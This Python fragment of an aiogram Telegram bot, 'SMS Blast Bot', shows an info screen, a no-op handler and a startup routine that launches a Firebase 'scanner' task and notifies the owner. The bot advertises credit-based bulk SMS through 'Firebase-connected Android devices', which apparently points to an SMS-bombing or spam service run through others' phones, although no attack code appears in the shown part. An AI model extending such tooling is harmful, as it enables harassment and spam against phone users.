async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"ℹ️ <b>SMS Blast Bot {_VERSION}</b>\n\n🤖 Bot for bulk SMS via Firebase-connected Android devices.\n\n"
        f"👤 Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n💬 Support: Contact owner.\n\n"
        f"<i>Bot use karne ke liye credits chahiye.</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

async def main():
    start_flask_thread()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")
    asyncio.create_task(initial_firebase_scan(bot))
    log.info("Initial scanner task created")
    try:
        await bot.send_message(
            MAIN_OWNER,
            f"🚀 <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"🔄 <b>Scanner:</b> Manual (refresh button)\n"
            f"👥 Per-User Sessions: ENABLED\n"
            f"🔒 Number Protection: ENABLED\n"
            f"📹 Video Section: ENABLED\n"
            f"💸 Credit Transfer: ENABLED\n"
            f"🌐 Flask Health: port {os.environ.get('PORT', 8080)}\n"
            f"👤 Bot Owner: {SUPER_ADMIN_NAME}",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"Owner notify: {e}")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
